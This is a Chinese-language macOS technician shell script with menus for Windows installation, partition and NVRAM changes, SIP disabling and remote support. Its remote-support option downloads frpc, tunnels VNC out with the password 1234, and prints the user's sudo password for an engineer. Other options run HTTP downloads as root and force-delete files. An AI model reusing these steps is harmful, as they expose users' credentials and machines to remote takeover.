#echo "$pass" | sudo -S sudo dscl . create /Users/Guest uid 201
echo "$pass" | sudo -S sudo dscl . -delete /Users/Guest
else
echo "$pass" | sudo -S sudo dscl . create /Users/"$yhm4" uid 502
fi
fi
fi
fi
fi

if [ "$yhm5" ] ; then
if [ "$yhm5" != "$yhm" ] ; then
yhqx5="$(dscl . -list /Users UniqueID | grep $yhm5 | grep 501)"
if [ ! "$yhqx5" ] ; then
yhqx5="$(dscl . -list /Users UniqueID | grep $yhm5 | grep 502)"
fi
if [ ! "$yhqx5" ] ; then
yhqx5="$(dscl . -list /Users UniqueID | grep $yhm5 | grep 201)"
fi
if [ ! "$yhqx5" ] ; then
if [ "$yhm5" != "Shared" ] ; then
if [ "$yhm5" = "Guest" ] ; then
#echo "$pass" | sudo -S sudo dscl . create /Users/Guest uid 201
echo "$pass" | sudo -S sudo dscl . -delete /Users/Guest
else
echo "$pass" | sudo -S sudo dscl . create /Users/"$yhm5" uid 502
fi
fi
fi
fi
fi

ZLDQ
    ;; 
    y)
if [ "$M1CPU" ] ; then 
ZLDQ
fi
if [ ! "$sip" ] ; then
clear && printf "\e[3J"
echo
read -s -n1 -p "？？？SIP已经关闭！！！"
ZLDQ
fi
if [ ! -e /Volumes/DOS ]; then   
clear && printf "\e[3J"
echo
read -s -n1 -p "不存在DOS安装分区，请手动创建安装分区，格式FAT或者Mac拓展日志式，名称：DOS "
ZLDQ
else
diskutil eraseVolume JHFS+ DOS /Volumes/DOS
fi
clear && printf "\e[3J"
echo
curl -# -C - --connect-timeout 10 -o /tmp/gbsip.zip "$ip5/gbsip.zip"
unzip -o "/tmp/gbsip.zip" -d "/Volumes/DOS">/dev/null 2>&1
clear && printf "\e[3J"
echo
echo
echo 请重启电脑按住option键，选EFI Boot
echo
echo 注意：进入后电脑会马上关机或者重启！
echo
exit
	;;
    r)
clear && printf "\e[3J"    
if [ ! "$apfsfq" ] ; then    
REHD="$(diskutil list | grep Apple_Boot)"
if [ ! "$REHD" ] ; then
clear && printf "\e[3J"
read -s -n1 -p "不存在恢复分区，请重建恢复分区！然后手动进入！"
ZLDQ
fi
fi
cp -R /Volumes/TeamViewerQS/TeamViewerQS.app ~/Desktop/打开我拍照给技术员.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo nvram "recovery-boot-mode=unused"
echo "$pass" | sudo -S sudo reboot
clear && printf "\e[3J"
exit 0
	;;
	qz)
clear && printf "\e[3J"
echo
echo
echo
read -p "请将需要删除的文件拉到这里！" jswj 	
echo "$pass" | sudo -S sudo chflags nouchg $jswj
echo "$pass" | sudo -S sudo chflags -hv noschg $jswj
echo "$pass" | sudo -S sudo rm -rf $jswj
ZLDQ
    ;;
    yc)
clear && printf "\e[3J"
vncip="$[RANDOM%100+6000]"
yhm="$(id -un)"
echo "[common]" >/tmp/$vncip.ini
echo "server_addr = $ftpip" >>/tmp/$vncip.ini
echo "server_port = 26534" >>/tmp/$vncip.ini
echo " " >>/tmp/$vncip.ini
echo "[vnc"$vncip"]" >>/tmp/$vncip.ini
echo "type = tcp" >>/tmp/$vncip.ini
echo "local_ip = 127.0.0.1" >>/tmp/$vncip.ini
echo "local_port = 5900" >>/tmp/$vncip.ini
echo "remote_port = $vncip" >>/tmp/$vncip.ini
echo "use_encryption=true" >>/tmp/$vncip.ini
echo "use_compression=true" >>/tmp/$vncip.ini
echo
if [ "$oldvn" ]; then
curl -# -C - --connect-timeout 10 -o /tmp/frpc.zip --retry 5 "$osip/frpcold.zip"
else
curl -# -C - --connect-timeout 10 -o /tmp/frpc.zip --retry 5 "$osip/frpc.zip"
fi
unzip -o "/tmp/frpc.zip" -d "/tmp">/dev/null 2>&1
pdpmgx=$(echo "$pass" | sudo -S sudo launchctl list com.apple.screensharing) >/dev/null 2>&1
pdpmgxx=$(echo "$pdpmgx" | grep "true")
if [ ! "$pdpmgxx" ]; then
if [ ! "$dkpm" ]; then
echo "$pass" | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setreqperm -reqperm yes >/dev/null 2>&1
echo "$pass" | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setvnclegacy -vnclegacy yes -setvncpw -vncpw 1234 >/dev/null 2>&1
osascript -e 'quit app"System Preferences"'
killall "System Preferences" >/dev/null 2>&1
open "x-apple.systempreferences:com.apple.preferences.sharing"
osascript -e 'Tell application "System Events" to display dialog "点OK，然后打开【屏幕共享】！" buttons {"OK"}'
open "x-apple.systempreferences:com.apple.preferences.sharing"
else
echo "$pass" | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setreqperm -reqperm yes >/dev/null 2>&1
echo "$pass" | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setvnclegacy -vnclegacy yes -setvncpw -vncpw 1234 >/dev/null 2>&1
echo "$pass" | sudo -S sudo defaults write /var/db/launchd.db/com.apple.launchd/overrides.plist com.apple.screensharing -dict Disabled -bool false >/dev/null 2>&1
echo "$pass" | sudo -S sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist >/dev/null 2>&1
fi
fi
clear && printf "\e[3J"
echo
echo
echo
echo """\033[42;30m 请勿关闭本窗口\033[0m"
echo
echo
echo """\033[42;30m 请将以下信息发给工程师：\033[0m"
echo
echo                                 $ftpip:$vncip | base64
echo                                 $yhm | base64
echo                                 $pass | base64
echo
echo
vnc=$(/tmp/frpc -c /tmp/$vncip.ini)
exit
    ;;
    sc)
clear && printf "\e[3J"
echo
echo
diskutil list disk0
diskutil list disk1
echo
read -p "请输入需要删除的分区，例如：disk0s3" scfq
diskutil eraseVolume "Free Space" %noformat% /dev/$scfq
ZLDQ
    ;;
	n)
echo "$pass" | sudo -S sudo nvram -c
echo "$pass" | sudo -S sudo reboot
    ;;
	1)
echo "$pass" | sudo -S sudo nvram manufacturing-enter-picker=true
ZLDQ
	;;
	2)
echo "$pass" | sudo -S sudo nvram manufacturing-enter-picker=false
ZLDQ
	;;
	3)
echo "$pass" | sudo -S sudo nvram SystemAudioVolume=%80
ZLDQ
	;;
	4)
echo "$pass" | sudo -S sudo nvram -d SystemAudioVolume
ZLDQ
	;;
	5)
echo "$pass" | sudo -S sudo nvram AutoBoot=%00
ZLDQ
	;;
	6)
echo "$pass" | sudo -S sudo nvram AutoBoot=%03
ZLDQ
	;;
	j)
clear && printf "\e[3J"
read -p "会清空下载文件夹，确认无误，输入大写 Y 回车：" scxzw
if [ "$scxzw" = "Y" ]; then
echo "$pass" | sudo -S sudo rm -rf ~/Downloads
echo "$pass" | sudo -S sudo mkdir -p ~/Downloads/JG_Download
echo "$pass" | sudo -S sudo chmod -R 0777 ~/Downloads
fi	
ZLDQ
    ;;
	p)
SCXNJ="1"
SCPD="1"
HBFQ
	;;
	v)
SCXNJ="1"
SCVM="1"
HBFQ
    ;;
	s)
if [ "$apfsfq" ] ; then
clear && printf "\e[3J"
read -s -n1 -p "APFS分区，无需删除！！！"
ZLDQ
fi
REHD="$(diskutil list | grep Apple_Boot)"
if [ ! "$REHD" ] ; then
clear && printf "\e[3J"
read -s -n1 -p "不存在恢复分区，无需删除！！！"
ZLDQ
fi
SCSIP="1"
HBFQ
	;;
	e)	
EFIS="1"
HBFQ
    ;;
    h)
clear && printf "\e[3J"
read -p "正在删除分区，确认无误，输入 Y 回车：" scxzw
if [ "$scxzw" = "y" ]; then    
HBFQS="1"
HBFQ
fi
if [ "$scxzw" = "Y" ]; then    
HBFQS="1"
HBFQ
fi
    ;;
    c)
if [ ! "$apfsfq" ] ; then     
REHD="$(diskutil list | grep Apple_Boot)"
if [ ! "$REHD" ] ; then
HFSIP
else
clear && printf "\e[3J"
read -s -n1 -p "存在恢复分区，无需重建！！！如需重建恢复分区请先删除！"
ZLDQ
fi
else
REHD="$(diskutil list | grep Recovery)"
if [ ! "$REHD" ] ; then
HFSIP
else
clear && printf "\e[3J"
read -s -n1 -p "存在恢复分区，无需重建！！！如需重建恢复分区请先删除！"
ZLDQ
fi
fi
ZLDQ
    ;;
    g)
if [ "$apfsfq" ] ; then
clear && printf "\e[3J"
read -s -n1 -p "APFS分区，无需升级！！！"
ZLDQ
fi
if [ ! "$NoWin7" ] ; then	
echo	
clear && printf "\e[3J"
read -s -n1 -p "此电脑不需要升级EFI固件！"
HBFQ	
fi
sjefi="1"
xtname="FirmwareUpdate.pkg"    
name="FirmwareUpdate.pkg"
url="$ip8/Os/FirmwareUpdate.pkg"
SourceSHA1="6262ce05bd87988b2f3fd77474ea09f7a08b091f"
Download
    ;;
    qjh)
clear && printf "\e[3J"
echo
osascript -e 'set volume output volume 1'
curl -# -C - --connect-timeout 10 -o /tmp/qjh.zip "http://data.mac55.com/3000mac/%E5%8D%83%E6%9C%BA%E6%B1%87%E8%87%AA%E5%8A%A8%E5%8A%A9%E6%89%8B_mac%E7%AB%AF.zip"
unzip -o "/tmp/qjh.zip" -d "/tmp">/dev/null 2>&1
echo "$pass" | sudo -S sudo /tmp/千机汇自动助手_mac端.app/Contents/MacOS/Macintosh
Customize
    ;;
    k)
if [ -e /Library/Developer/CommandLineTools ]; then
clear && printf "\e[3J"
echo
read -s -n1 -p "已经安装签名工具，无需安装！！！"
ZLDQ
fi
if [[ $modelxh = "14."* ]]; then    
aztool="1" 
xtname="Command_Line_Tools_for_Xcode_14.2.dmg"     
name="Command_Line_Tools_for_Xcode_14.2.dmg"
url="$ipd/Command_Line_Tools_for_Xcode_14.2.dmg"
SourceSHA1="f9d18da696bc54755bd85fb4f42c0a8866bdade6"
Download
fi
if [[ $modelxh = "13."* ]]; then    
aztool="1" 
xtname="Command_Line_Tools_for_Xcode_14.2.dmg"     
name="Command_Line_Tools_for_Xcode_14.2.dmg"
url="$ipd/Command_Line_Tools_for_Xcode_14.2.dmg"
SourceSHA1="f9d18da696bc54755bd85fb4f42c0a8866bdade6"
Download
fi
if [[ $modelxh = "12."* ]]; then    
aztool="1" 
xtname="Command_Line_Tools_for_Xcode_13.4.dmg"     
name="Command_Line_Tools_for_Xcode_13.4.dmg"
url="$ipd/Command_Line_Tools_for_Xcode_13.4.dmg"
SourceSHA1="f233de8f232403ede3513a14137bab24d32a4a85"
Download
fi
if [[ $modelxh = "11."* ]]; then    
aztool="1" 
xtname="Command_Line_Tools_for_Xcode_12.5.1.dmg"     
name="Command_Line_Tools_for_Xcode_12.5.1.dmg"
url="$ipd/Command_Line_Tools_for_Xcode_12.5.1.dmg"
SourceSHA1="eaf175f4c8854511a6e829f360eb3a7d59afa517"
Download
fi
if [[ $modelxh = "10.15"* ]]; then    
aztool="1" 
xtname="Command_Line_Tools_for_Xcode_11.5.dmg"     
name="Command_Line_Tools_for_Xcode_11.5.dmg"
url="$ipd/Command_Line_Tools_for_Xcode_11.5.dmg"
SourceSHA1="23943d6eaccdec9290077457252132707298210f"
Download
fi
if [[ $modelxh = "10.14"* ]]; then    
aztool="1" 
xtname="Command_Line_Tools_macOS_10.14_for_Xcode_10.3.dmg"     
name="Command_Line_Tools_macOS_10.14_for_Xcode_10.3.dmg"
url="$ipd/Command_Line_Tools_macOS_10.14_for_Xcode_10.3.dmg"
SourceSHA1="c7ec69aaccf2ee0b8a838a7396872540c10d1983"
Download
fi
if [[ $modelxh = "10.13"* ]]; then    
aztool="1" 
xtname="Command_Line_Tools_macOS_10.13_for_Xcode_10.1.dmg"
name="Command_Line_Tools_macOS_10.13_for_Xcode_10.1.dmg"
url="$ipd/Command_Line_Tools_macOS_10.13_for_Xcode_10.1.dmg"
SourceSHA1="0abb5bc93aaa3a23730a19bc9cfb1248b1cb69e5"
Download
fi
    ZLDQ
    ;;
    q)
defaults write com.apple.finder AppleShowAllFiles -boolean true;killall Finder
ZLDQ    
    ;;
    w)
defaults write com.apple.finder AppleShowAllFiles -boolean false;killall Finder
ZLDQ    
    ;;
    0)
if [ "$fhxtlb" ] ; then  
XTLB
fi
	Start_menu
	;;
	x)
if [ "$fhxtlb" ] ; then  
fhxtlb=""
XTLB
fi	
	Start_menu
	;;	
esac
    ZLDQ
}


MSDN(){
clear && printf "\e[3J"
disk_total="$(df -h | head -2 | tail -1 | awk '{print $2}' | sed 's/i/B/g')[总]"
disk_used="$(df -h | head -2 | tail -1 | awk '{print $4}' | sed 's/i/B/g')[可用]"
Disk="$disk_used / $disk_total"
if [ ! "$oldusb" ]; then
jiami="$(fdesetup status | grep Encryption)"
fi
azwin7=""
azwin8=""
if [ ! "$xtbb" ]; then
if [ "$T2XP" ]; then
xtbb="1809"
else
xtbb="1709"
fi
if [ "$pcissd" ]; then
xtbb="1511"
fi

if [ -f ~/Downloads/JG_Download/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd ]; then 
xtbb="1909"
fi

if [ -f ~/Downloads/JG_Download/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd ]; then 
xtbb="22H2"
fi

fi
if [ ! "$xtyy" ]; then
xtyy="zh-cn"
fi
if [ ! "$isok" ]; then
isok="关"
isoesd=""
fi
if [ ! "$isoyh" ]; then
isoyh="关"
fi
if [ ! "$w1122" ]; then
k22h2="关"
fi
if [ ! "$mjh77" ]; then
mjh77="关"
mjh7=""
fi
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
if [[ "$xtyy" = "zh-cn" ]]; then
echo 语言: "\033[36m简体\033[0m               "     "${Disk}" 
fi
if [[ "$xtyy" = "zh-tw" ]]; then
echo 语言: "\033[36m繁体\033[0m               "     "${Disk}" 
fi
if [[ "$xtyy" = "en-us" ]]; then
echo 语言: "\033[36m英语\033[0m               "     "${Disk}" 
fi
if [[ "$xtyy" = "ja-jp" ]]; then
echo 语言: "\033[36m日语\033[0m               "     "${Disk}" 
fi
if [[ "$xtyy" = "ko-kr" ]]; then
echo 语言: "\033[36m韩语\033[0m               "     "${Disk}" 
fi
if [ "$NoWin7" ]; then
azwin7="........"
azwin8="........"
azwin732="..........."
else
azwin7="Windows7"
azwin8="Windows8"
azwin732="Windows7x32"
if [ "$No732" ]; then
azwin732="..........."
fi
fi
if [ "$sip" ]; then
echo
echo "本机机型："$dnjx"" SIP $yphdd
echo
else
echo
echo "本机机型："$dnjx"" $yphdd
echo
fi
if [ "$xkbcz" ]; then
echo
read -s -n1 -p "此机型，检测不到独立显卡，无法安装！"
echo
fi
if [ "$jiami" ]; then
echo
read -s -n1 -p "注意：磁盘正在加密中...."
open "x-apple.systempreferences:com.apple.preference.security?FDE"
echo
fi
if [ "$pcissd" ]; then
echo
echo "注意：检测到PCI转接硬盘！"
echo
fi
if [ ! "$oldusb" ]; then
if [ "$wybxsq" ]; then
echo
read -s -n1 -p "注意：无屏幕或者非原厂屏！"
echo
fi
fi
EFIS=""
HBFQS=""
PEDrv=""
repe=""
name=""
url=""
name2=""
url2=""
mjh7=""
soft=""
re700=""
re800=""
index=""
OsWin764=""
SourceSHA1=""
SourceMD5=""
SourceMD52=""
pnputil=""
Win11=""
drvname=""
xtname=""
xtname2=""
xnjaz=""
pd107z=""
azw11=""
azw10=""
azw7=""
isoName=""
uups=""
iso7=""
HFSIP=""
azuppe=""
azbdpe=""
upazmac=""
azmac=""
azof=""
SCPD=""
SCVM=""
SCXNJ=""
CustomizeURL=""
DrvWZ=""
if [ ! "$xzyc" ]; then
xzyc=A
fi	
if [ ! "$azms" ]; then
azms=A
fi	
echo "    ______________________       MSDN      _________________________"
echo "   |                      -----------------                         |"
echo "   |                                                                |"
echo "   |   \033[35m[1]\033[0m "$xtbb"专业版         \033[35m[2]\033[0m "$xtbb"家庭版     \033[35m[3]\033[0m "$xtbb"企业版     |"
echo "   |                                                                |"
echo "   |   \033[35m[4]\033[0m "$xtbb"家庭中文版     \033[35m[Z]\033[0m 切换Win10      \033[35m[W]\033[0m 切换Win11      |"
echo "   |                                                                |"
echo "   |   \033[35m[I]\033[0m 制作ISO"$isok"          \033[35m[Q]\033[0m 切换语言       \033[35m[Y]\033[0m WinYH"$isoyh"        |"
echo "   |                                                                |"
echo "   |   \033[35m[7]\033[0m "$azwin7"           \033[35m[S]\033[0m "$azwin732"    \033[35m[M]\033[0m MJH"$mjh77"          |"
echo "   |                                                                |"
echo "   |   \033[35m[8]\033[0m "$azwin8"           \033[35m[B]\033[0m ISO镜像备用    \033[35m[K]\033[0m Win11-22H2"$k22h2"   |"
echo "   |                                                                |"
echo "   |   \033[35m[L]\033[0m LTSC2019           \033[35m[C]\033[0m LTSC2016                          |"
echo "   |                                                                |"
echo "   |   \033[35m[x]\033[0m 返回               \033[35m[E]\033[0m 下载引擎："$xzyc"    \033[35m[A]\033[0m 安装模式："$azms"    |"
echo "   |                                                                |"
echo "   |________________________________________________________________|"
echo
echo
read -p "_______请输入:" num
echo
case "$num" in
	e)
	if [[ "$xzyc" = "A" ]]; then
	if [ -f ~/Downloads/JG_Download/*.aria2  ]; then
	clear && printf "\e[3J"
	echo
	echo 存在A引擎下载的文件的缓存，请手动确认删除！
	echo
	read -s -n1 -p " "
	open ~/Downloads/JG_Download
	MSDN
	fi	
	xzyc="C"
	dur="1"
	MSDN
	fi
	if [[ "$xzyc" = "C" ]]; then
    xzyc="A"
    dur=""
	MSDN
	fi
	;;
	a)
	if [[ "$azms" = "A" ]]; then
	if [ "$MBR10" ]; then
	MSDN	
	fi
	if [[ $modelxh = "10.6"* ]]; then	
	MSDN	
	fi
	if [[ $modelxh = "10.7"* ]]; then	
	MSDN	
	fi
	if [[ $modelxh = "10.8"* ]]; then	
	MSDN	
	fi
	if [[ $modelxh = "10.9"* ]]; then	
	MSDN
	fi
	azms="B"
	DrvWin10="1"
	MSDN
	fi
	if [[ "$azms" = "B" ]]; then
    azms="A"
    DrvWin10="1"
	MSDN
	fi
	;;
    y)
	if [[ "$isoyh" = "关" ]]; then
	isoyh="开"
	xtyh="1"
	MSDN
	fi
	if [[ "$isoyh" = "开" ]]; then
	isoyh="关"
	xtyh=""
	MSDN
	fi
	;;
	m)
	if [[ "$mjh77" = "关" ]]; then
	mjh77="开"
	mjh7="1"
	MSDN
	fi
	if [[ "$mjh77" = "开" ]]; then
	mjh77="关"
	mjh7=""
	MSDN
	fi
	;;
    i)
	if [[ "$isok" = "关" ]]; then
	isok="开"
	isoesd="1"
	MSDN
	fi
	if [[ "$isok" = "开" ]]; then
	isok="关"
	isoesd=""
	MSDN
	fi
	;;
    q)
	if [[ "$xtyy" = "zh-cn" ]]; then
	xtyy="zh-tw"
	MSDN
	fi
	if [[ "$xtyy" = "zh-tw" ]]; then
	xtyy="en-us"
	MSDN
	fi
	if [[ "$xtyy" = "en-us" ]]; then
	xtyy="ja-jp"
	MSDN
	fi
	if [[ "$xtyy" = "ja-jp" ]]; then
	xtyy="ko-kr"
	MSDN
	fi
	if [[ "$xtyy" = "ko-kr" ]]; then
	xtyy="zh-cn"
	MSDN
	fi
	;;
	z)
	if [[ "$xtbb" = "22H2" ]]; then
	xtbb="21H2"
	MSDN
	fi
	if [[ "$xtbb" = "21H2" ]]; then
	xtbb="2H02"
	MSDN
	fi
	if [[ "$xtbb" = "2H02" ]]; then
	xtbb="2004"
	MSDN
	fi
	if [[ "$xtbb" = "2004" ]]; then
	xtbb="1909"
	MSDN
	fi
	if [[ "$xtbb" = "1909" ]]; then
	xtbb="1809"
	MSDN
	fi
	if [[ "$xtbb" = "1809" ]]; then
	xtbb="1709"
	MSDN
	fi
	if [[ "$xtbb" = "1709" ]]; then
	xtbb="1511"
	MSDN
	fi
	if [[ "$xtbb" = "1511" ]]; then
	xtbb="22H2"
	MSDN
	fi
	if [[ "$xtbb" = "Wi11" ]]; then
	xtbb="22H2"
	MSDN
	fi
	;;
	w)
	xtbb="Wi11"
	k22h2="关"
	w1122=""
	MSDN
	;;
	k)
	if [[ "$k22h2" = "关" ]]; then
	k22h2="开"
	xtbb="Wi11"
	w1122="1"
	MSDN
	fi
	if [[ "$k22h2" = "开" ]]; then
	k22h2="关"
	w1122=""
	MSDN
	fi
	;;
	1)
	if [[ "$xtbb" = "22H2" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then
	index="7"
	SourceSHA1="485efaca7f0c0e017e4bb0c565ec48dfd0f78695"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/5fdb4d51-62f0-41bb-9487-d80b18bc11f7/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd"
	fi
	if [[ "$xtyy" = "zh-tw" ]]; then
	index="6"
	SourceSHA1="2609e677bbe6bec2c516b73ecb19727a711c43b3"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/c5e26e09-9a46-4543-ab9c-d0bce2894171/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-tw.esd"
	fi
	if [[ "$xtyy" = "en-us" ]]; then
	index="9"
	SourceSHA1="cb5d06fb5e5f21b8615d202ce6fc5f11bde79624"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/ccc3c3f4-dcca-44b3-8381-1d6c1c58fd4f/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_en-us.esd"
	fi
	if [[ "$xtyy" = "ja-jp" ]]; then
	index="6"
	SourceSHA1="71b1aa5517722a0c5e40eab533f6057dc434a2b8"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/5a3d3076-277c-40af-802a-804482e396be/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ja-jp.esd"
	fi
	if [[ "$xtyy" = "ko-kr" ]]; then
	index="6"
	SourceSHA1="52f99fdb2edbac3c112918e6ee0a97df5336fdd6"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/00eaf4bc-62bd-47e8-bcb6-4ca2c607c6da/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ko-kr.esd"
	fi
	name=${url##*/}
	fi
	if [[ "$xtbb" = "21H2" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then
	index="7"
	SourceSHA1="b3bf39da71b54027ec3d6698803b8429393de608"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/09/19044.1165.210806-1742.21h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn_b3bf39da71b54027ec3d6698803b8429393de608.esd"
	fi
	if [[ "$xtyy" = "zh-tw" ]]; then
	index="6"
	SourceSHA1="ce3228aeef53026e855b7e801af053cf671d8028"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/09/19044.1165.210806-1742.21h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-tw_ce3228aeef53026e855b7e801af053cf671d8028.esd"
	fi
	if [[ "$xtyy" = "en-us" ]]; then
	index="9"
	SourceSHA1="e2492e60dcdbffc18f828167e96699335aa8396c"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/09/19044.1165.210806-1742.21h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_en-us_e2492e60dcdbffc18f828167e96699335aa8396c.esd"
	fi
	if [[ "$xtyy" = "ja-jp" ]]; then
	index="6"
	SourceSHA1="e0f708eab8eaa9f4c7a98c81a15b0ffcfa1aaba2"
	url="http://b1.download.windowsupdate.com/c/upgr/2021/09/19044.1165.210806-1742.21h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ja-jp_e0f708eab8eaa9f4c7a98c81a15b0ffcfa1aaba2.esd"
	fi
	if [[ "$xtyy" = "ko-kr" ]]; then
	index="6"
	SourceSHA1="c4816c63965428fde8d02758b054d36c0c3c7cfa"
	url="http://b1.download.windowsupdate.com/c/upgr/2021/09/19044.1165.210806-1742.21h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ko-kr_c4816c63965428fde8d02758b054d36c0c3c7cfa.esd"
	fi
	name=${url##*/}
	fi
	if [[ "$xtbb" = "Wi11" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then
	Win11="1"
	index="7"
	SourceSHA1="72b952bfa9248917c9ff7cf54d63b69f78d18861"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/e53a2dce-3faa-412f-a60a-2e9cba4c6010/22000.318.211104-1236.co_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd"
	if [ "$w1122" ]; then
	SourceSHA1="bd4a27bf5019eb3bc27a48d10b5564665e0945fd"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/9282e556-e4ce-4e75-a650-3b8dea2f060a/22621.525.220925-0207.ni_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd"	
	fi
	fi
	if [[ "$xtyy" = "zh-tw" ]]; then
	index="6"
	SourceSHA1="9453708f66b61f35c3810e7921a4684ad00e4e85"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/08/22000.132.210809-2349.co_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-tw_9453708f66b61f35c3810e7921a4684ad00e4e85.esd"
	if [ "$w1122" ]; then
	SourceSHA1="a58d8625f84e64585812ff96e6a73ef89f7d8c59"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/0b4200a9-1404-4839-8ddb-410011c8a682/22621.525.220925-0207.ni_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-tw.esd"	
	fi
	fi
	if [[ "$xtyy" = "en-us" ]]; then
	index="9"
	SourceSHA1="966cbea0f8a06f27f64658a5db8a9f0dd43c77ed"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/08/22000.132.210809-2349.co_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_en-us_966cbea0f8a06f27f64658a5db8a9f0dd43c77ed.esd"
	if [ "$w1122" ]; then
	SourceSHA1="2057bb288e6e99f9ed799b4e32bc76113471770f"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/b55d248a-3c1e-49aa-9115-1628824af2dc/22621.525.220925-0207.ni_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_en-us.esd"	
	fi
	fi
	if [[ "$xtyy" = "ja-jp" ]]; then
	index="6"
	SourceSHA1="f1b0b7c82ece337fa3836c339eff203d603a1144"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/08/22000.132.210809-2349.co_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ja-jp_f1b0b7c82ece337fa3836c339eff203d603a1144.esd"
	if [ "$w1122" ]; then
	SourceSHA1="c1b6557597e9f26d0af3aa3d16b2e6aa12ae9bab"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/f113b28c-22fd-42f3-8d68-671f6fc0b628/22621.525.220925-0207.ni_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ja-jp.esd"	
	fi
	fi
	if [[ "$xtyy" = "ko-kr" ]]; then
	index="6"
	SourceSHA1="0a9443823e621fb77ab827def4054d0e5ec53d01"
	url="http://b1.download.windowsupdate.com/c/upgr/2021/08/22000.132.210809-2349.co_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ko-kr_0a9443823e621fb77ab827def4054d0e5ec53d01.esd"
	if [ "$w1122" ]; then
	SourceSHA1="46052359537a9feea079c259fe66bb5f7ba9263f"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/7e6a8fda-92eb-4ae9-8a9a-264d622372bf/22621.525.220925-0207.ni_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ko-kr.esd"	
	fi
	fi	
	name=${url##*/}
	fi
	if [[ "$xtbb" = "1709" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then	
	index="8"
	SourceSHA1="cc52c191fda2caff9d5b6730ee88a11758dc0138"
	url="http://fg.ds.b1.download.windowsupdate.com/c/Upgr/2017/10/16299.15.170928-1534.rs3_release_clientconsumer_ret_x64fre_zh-cn_cc52c191fda2caff9d5b6730ee88a11758dc0138.esd"
	fi
	name=${url##*/}
	fi
	if [[ "$xtbb" = "1809" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then	
	index="7"
	#SourceSHA1="1a644e45bd9b1b88b45a7d345d5b63ca589813e4"
	#url="http://fg.ds.b1.download.windowsupdate.com/d/Upgr/2018/09/17763.1.180914-1434.rs5_release_clientconsumer_ret_x64fre_zh-cn_1a644e45bd9b1b88b45a7d345d5b63ca589813e4.esd"
	SourceSHA1="183291d7e96d2ff2cb65abb7edb9c96f1139fd37"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/dbd14770-9bf7-4c72-9f15-2d0c88cbb4b3/17763.379.190312-0539.rs5_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd"
	fi
	name=${url##*/}
	fi
	if [[ "$xtbb" = "1909" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then	
	index="7"
	SourceSHA1="339b54a7c6f73e30b8d235c5b97c2e5e31f7d392"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/3f88ad25-f1b2-49fa-b580-fb8d1ac54ecb/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd"
	fi
	if [[ "$xtyy" = "zh-tw" ]]; then	
	index="7"
	SourceSHA1="6ea61e025ff52d9fc612a0d40bd2764204141ce7"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/14673831-a565-46f4-be56-484c9b598b0e/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-tw.esd"
	fi
	if [[ "$xtyy" = "en-us" ]]; then	
	index="9"
	SourceSHA1="200ca757148b240519937662985f5e098e2ef207"
